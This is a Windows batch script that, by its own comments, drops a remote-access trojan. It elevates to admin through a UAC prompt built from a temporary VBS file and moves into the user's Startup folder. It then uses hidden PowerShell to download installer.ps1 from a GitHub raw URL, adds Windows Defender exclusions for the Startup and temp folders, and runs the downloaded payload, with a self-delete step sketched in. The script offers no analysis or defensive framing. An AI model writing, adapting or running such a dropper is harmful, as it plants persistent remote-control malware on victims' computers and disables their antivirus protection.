REM get admin permissions for script
REM created by : jfrdgh (@bigmanlc on dc)
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM disable defender

REM cd to startup
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %STARTUP%

REM rat resources
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1 -OutFile installer.ps1"
powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
powershell ./installer.ps1


@REM self delete
@REM del GetAdmnInstKL.cmd